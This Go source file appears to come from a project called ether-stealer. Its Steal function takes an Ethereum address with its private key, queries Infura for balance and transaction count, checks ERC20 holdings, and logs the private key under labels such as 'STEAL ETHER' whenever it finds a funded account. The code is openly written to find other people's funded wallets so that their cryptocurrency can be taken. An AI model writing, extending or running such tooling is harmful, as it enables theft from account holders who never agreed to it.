package steal

import (
	"fmt"

	"github.com/ethereum/go-ethereum/common"

	"github.com/hexoul/ether-stealer/contract"
	"github.com/hexoul/ether-stealer/json"
	"github.com/hexoul/ether-stealer/log"
)

const (
	urlForBalance = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getBalance?params=[\"%s\",\"latest\"]"
	urlForTxCount = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getTransactionCount?params=[\"%s\",\"latest\"]"
)

func get(baseURL, addr string) (b bool, val string) {
	url := fmt.Sprintf(baseURL, addr)
	ret, err := json.GetRPCResponseFromURL(url)
	if err != nil {
		fmt.Println("UNSTABLE NETWORK")
		return
	}

	switch ret.Result.(type) {
	case string:
		if val = ret.Result.(string); val != "0x0" {
			b = true
		}
	}
	return
}

func hasBalance(addr string) (b bool, val string) {
	return get(urlForBalance, addr)
}

func hasTxCount(addr string) (b bool, val string) {
	return get(urlForTxCount, addr)
}

// Steal ether online through infura
func Steal(addr common.Address, privkey []byte) {
	addrStr := addr.String()
	if canStealEther, _ := hasBalance(addrStr); canStealEther {
		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
	} else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
		log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
	} else if canStealERC := contract.CanSteal(addr); canStealERC != "" {
		log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addrStr, privkey, canStealERC)
	} else {
		fmt.Printf("FAILED from %s\n", addrStr)
	}
}
